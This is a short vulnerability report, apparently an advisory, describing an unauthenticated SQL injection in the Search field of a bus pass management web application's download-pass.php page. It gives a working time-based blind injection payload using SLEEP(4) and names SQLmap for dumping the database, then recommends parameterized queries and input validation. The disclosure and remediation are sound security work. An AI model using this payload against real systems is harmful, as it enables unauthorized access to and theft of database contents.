*SQL Injection:*
SQL injection is a web security vulnerability that allows an attacker to alter the SQL queries made to the database. This can be used to retrieve some sensitive information, like database structure, tables, columns, and their underlying data.

*Attack Vector:*
An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.

*Steps to reproduce:*
Step-1: Open 'View Pass' page using following URL:
http://127.0.0.1/buspassms/download-pass.php


2. Now put the below payload in the 'Search' field.
*Payload: *123' AND (SELECT 7169 FROM (SELECT(SLEEP(4)))abhi) AND 'x'='x

3. Server accepted our payload and the response got delayed by 4 seconds.

*IMPACT:*
As the vulnerable parameter is an external parameter (credentials not
required), an attacker can dump the database of the application remotely.

Suggested Mitigation/Remediation Actions
Parameterized queries should be used to separate the command and data
portions of the intended query to the database. These queries prevent
an attacker from tampering with the query logic and extending a
concatenated database query string. Code reviews should be conducted
to identify any additional areas where the application or other
applications in the organization are vulnerable to this attack.
Additionally, input validation should be enforced on the server side
in order to ensure that only expected data is sent in queries. Where
possible security specific libraries should be used in order to
provide an additional layer of protection.
